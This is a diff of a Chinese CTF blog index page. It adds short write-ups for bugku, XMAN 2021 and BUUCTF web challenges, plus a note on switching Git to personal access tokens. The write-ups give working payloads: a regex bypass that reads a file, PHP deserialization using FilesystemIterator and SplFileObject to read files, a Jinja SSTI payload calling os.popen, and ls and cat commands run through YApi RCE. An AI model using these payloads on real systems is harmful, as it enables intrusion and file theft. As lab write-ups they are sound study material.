@@ -164,6 +164,576 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-bugku-web-No-one-knows-regex-better-than-me" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/">bugku-web-No one knows regex better than me</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/" class="archive-article-date">
+  	<time datetime="2021-08-09T09:52:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$zero&#x3D;$_REQUEST[&#39;zero&#39;];</span><br><span class="line">$first&#x3D;$_REQUEST[&#39;first&#39;];</span><br><span class="line">$second&#x3D;$zero.$first;</span><br><span class="line">if(preg_match_all(&quot;&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;i&quot;,$second))&#123;</span><br><span class="line">    $key&#x3D;$second;</span><br><span class="line">    if(preg_match(&quot;&#x2F;\.\.|flag&#x2F;&quot;,$key))&#123;</span><br><span class="line">        die(&quot;Noooood hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $third&#x3D;$first;</span><br><span class="line">        if(preg_match(&quot;&#x2F;\\|\056\160\150\x70&#x2F;i&quot;,$third))&#123;</span><br><span class="line">            $end&#x3D;substr($third,5);</span><br><span class="line">            highlight_file(base64_decode($zero).$end);&#x2F;&#x2F;maybe flag in flag.php</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最大的难点在<code>preg_match(&quot;/\\|\056\160\150\x70/i&quot;,$third)</code>这句，因为php会自动把所有带<code>\</code>的转译，并且会转译到不能转移为止，所以这句话实际上是<code>preg_match(&quot;|.php/i&quot;,$third)</code></p>
+<p>这里构造payload我就直接利用他给的<code>|.php</code>构造了，所以为了绕过<code>substr($third,5)</code>,要在前面补四个字母，不能是flag所以只能选“girl”<br>所以前面就补一个base64加密后的“flag”，为ZmxhZw==<br>所以最后的payload为：?zero=ZmxhZw==&amp;first=girl|.php<br>得到flag</p>
+<img src="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/1.PNG" class="" title="1.PNG">
+
+<p>也可以把后面的全部消除掉，那么base64加密的就是flag.php（ZmxhZy5waHA=，因为正好有a，所以可以绕过上面的验证）<br>payload为：?zero=ZmxhZy5waHA=&amp;first=|.php</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-个人令牌" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">git个人令牌</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/" class="archive-article-date">
+  	<time datetime="2021-08-09T07:48:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="关于2021年8月13日后git不接受账号密码修改的应对"><a href="#关于2021年8月13日后git不接受账号密码修改的应对" class="headerlink" title="关于2021年8月13日后git不接受账号密码修改的应对"></a>关于2021年8月13日后git不接受账号密码修改的应对</h2><p>今天上传博客的时候，<del>我在配置好ssh的情况下被要求输入账号和密码，并且</del>接到这样一条邮件——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You recently used a password to access the repository at ouroborosscr&#x2F;ouroborosscr.github.io with git using git&#x2F;2.9.0.windows.1.</span><br><span class="line"></span><br><span class="line">Basic authentication using a password to Git is deprecated and will soon no longer work. Visit https:&#x2F;&#x2F;github.blog&#x2F;2020-12-15-token-authentication-requirements-for-git-operations&#x2F; for more information around suggested workarounds and removal dates.</span><br></pre></td></tr></table></figure>
+<p>意思是以后这种方法将会被弃用，<del>原来的ssh都会因此而作废，这就导致市面上大多数hexo的教程可能会因此失效（毕竟将无法上传）</del><br>根据建议打开网站——<a target="_blank" rel="noopener" href="https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/">https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/</a></p>
+<p>了解到需要“个人访问令牌”，那就顺着流程做——<a target="_blank" rel="noopener" href="https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token</a></p>
+<p>其中，权限只选中repo就够了。</p>
+<p>跟着流程创建完之后，<code>git --verdion</code>检查一下自己git的版本，如果低于2.29，就下一个最新版安装——<a target="_blank" rel="noopener" href="https://github.com/git-for-windows/git/releases/tag/v2.32.0.windows.2">https://github.com/git-for-windows/git/releases/tag/v2.32.0.windows.2</a></p>
+<p>然后换https（这里只列举https，换git的方法差不多，但是这样的有一个好处是比ssh传输速度快很多），打开cmd（或git bush）输入git remote -v查看自己连接的库<br>如果报错，就是权限不够，先输一个git init，再输入<br>如果什么回显都没有，就是没有连接，直接输入<code>git remote add origin &quot;https://github.com/USERNAME/REPOSITORY.git&quot;</code><br>(记得改成自己的用户名和库名)<br>如果有类似</p>
+<figure class="highlight plain"><figcaption><span>git remote -v</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; origin  git@github.com:USERNAME&#x2F;REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  git@github.com:USERNAME&#x2F;REPOSITORY.git (push)</span><br></pre></td></tr></table></figure>
+<p>这样的回显，就输入<code>$ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>(记得改成自己的用户名和库名)</p>
+<p>然后输入git remote -v测试一下就行了<br>改后——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line"># Verify new remote URL</span><br><span class="line">&gt; origin  https:&#x2F;&#x2F;github.com&#x2F;USERNAME&#x2F;REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  https:&#x2F;&#x2F;github.com&#x2F;USERNAME&#x2F;REPOSITORY.git (push)</span><br></pre></td></tr></table></figure>
+
+<p>之后在运行hexo d 的时候，明显传输速度直线上升</p>
+<p>后来发现，也可能是因为我原来用ssh传输太慢，可能某次修改的时候，把原来的ssh的库给换掉了，其实直接<code>git remote add origin &quot;git@github.com:USERNAME/REPOSITORY.git&quot;</code>也可以换回ssh，也能应付这种情况，但是问题是速度是真的慢，和被墙了一样</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-xman2021-easyphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/08/xman2021-easyphp/">xman2021-easyphp</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/08/xman2021-easyphp/" class="archive-article-date">
+  	<time datetime="2021-08-08T12:15:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>dasctf的原题,就改了一下文件结构和类名</p>
+<p>源码——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class;</span><br><span class="line">    public $para;</span><br><span class="line">    public $check;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;class &#x3D; &quot;Hel&quot;;</span><br><span class="line">        $this-&gt;para &#x3D; &quot;xctfer&quot;;</span><br><span class="line">        echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;check &#x3D; new Filter;</span><br><span class="line">        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;</span><br><span class="line">            echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            die(&#39;what?Really?&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Hel&#123;</span><br><span class="line">    var $a;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a &#x3D; $a;</span><br><span class="line">        echo (&quot;Hello bro, I guess you are a lazy &quot;.$this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Filter&#123;</span><br><span class="line"></span><br><span class="line">    function vaild($code)&#123;</span><br><span class="line">        $pattern &#x3D; &#39;&#x2F;[!|@|#|$|%|^|&amp;|*|&#x3D;|\&#39;|&quot;|:|;|?]&#x2F;i&#39;;</span><br><span class="line">        if (preg_match($pattern, $code))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;xctf&#39;]))&#123;</span><br><span class="line">    unserialize($_GET[&#39;xctf&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a&#x3D;new XMAN;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这句我一开始不太明白这句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new  $this-&gt;class ($this-&gt;para);</span><br></pre></td></tr></table></figure>
+<p>然后搜了一下，结果就直接搜到原题了</p>
+<p>这句的意思是：$this-&gt;class类（其实当成函数看就行）的参数是$this-&gt;para</p>
+<p>所以payload——<br>用FilesystemIterator遍历目录(把/换成文件夹，直到找到要打开的文件夹)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;FilesystemIterator&#39;;</span><br><span class="line">    public $para&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$o  &#x3D; new XMAN();</span><br><span class="line">echo serialize($o);</span><br></pre></td></tr></table></figure>
+
+<p>用SplFileObject读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;SplFileObject&#39;;</span><br><span class="line">    public $para &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;xxxXXXmMManNNn&#x2F;f1a4.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new XMAN();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/08/xman2021-easyphp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-xman2021-easyssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/08/xman2021-easyssti/">xman2021-easyssti</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/08/xman2021-easyssti/" class="archive-article-date">
+  	<time datetime="2021-08-08T11:58:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>gwctf2019的原题，现在也可以在buuctf上做——<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97">https://buuoj.cn/challenges#[GWCTF%202019]%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97</a></p>
+<p>虽然网上很多都在用curl ip端口的方法，<del>不过那个方法我怎么都没复现出来。</del>终于找到了原因：防火墙没开，想让外网发现自己，必须把防火墙的相应端口打开</p>
+<p>还好找到这个大佬的做法——<a target="_blank" rel="noopener" href="https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/">https://johnfrod.top/uncategorized/gwctf-2019%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload——&#123;%print lipsum.__globals__[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;__im&#39;+&#39;port__&#39;](&#39;o&#39;+&#39;s&#39;)[&#39;po&#39;+&#39;pen&#39;](&#39;whoami&#39;).read()%&#125;</span><br></pre></td></tr></table></figure>
+<p>然后把whoami换成ls之类的shell指令就行</p>
+<img src="/2021/08/08/xman2021-easyssti/1.PNG" class="" title="1.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/08/xman2021-easyssti/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-buu-ezrce" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/04/buu-ezrce/">buu-ezrce</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/04/buu-ezrce/" class="archive-article-date">
+  	<time datetime="2021-08-04T03:37:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开后发现是yapi界面，直接搜“yapi漏洞”<br>前面的步骤按照这篇来就行——<a target="_blank" rel="noopener" href="https://blog.csdn.net/Trouble_99/article/details/118667625">https://blog.csdn.net/Trouble_99/article/details/118667625</a><br>最后改代码中ls为<br>ls ..;<br>ls ../..;<br>找到ffffffflllllaggggg<br>cat ../../ffffffflllllaggggg就行</p>
+<img src="/2021/08/04/buu-ezrce/1.PNG" class="" title="1.PNG">
+<img src="/2021/08/04/buu-ezrce/2.PNG" class="" title="2.PNG">
+<img src="/2021/08/04/buu-ezrce/3.PNG" class="" title="3.PNG">
+<img src="/2021/08/04/buu-ezrce/4.PNG" class="" title="4.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/04/buu-ezrce/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-buu-easythinkphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/04/buu-easythinkphp/">buu-easythinkphp</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/04/buu-easythinkphp/" class="archive-article-date">
+  	<time datetime="2021-08-04T02:08:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开发现thinkphp就没办法了</p>
+<img src="/2021/08/04/buu-easythinkphp/1.PNG" class="" title="1.PNG">
+<p>后来看大佬的解答，用的是thinkphp低版本的rce漏洞<br>（thinkphpgui脚本）</p>
+<img src="/2021/08/04/buu-easythinkphp/2.PNG" class="" title="2.PNG">
+<img src="/2021/08/04/buu-easythinkphp/3.PNG" class="" title="3.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/04/buu-easythinkphp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-buu-easyweb" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -490,586 +1060,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/08/01/bugku-web-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-好像需要密码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/">bugku-web-好像需要密码</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/" class="archive-article-date">
-  	<time datetime="2021-08-01T03:54:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>没意思，纯爆破，浪费金币</p>
-<img src="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/01/bugku-web-%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
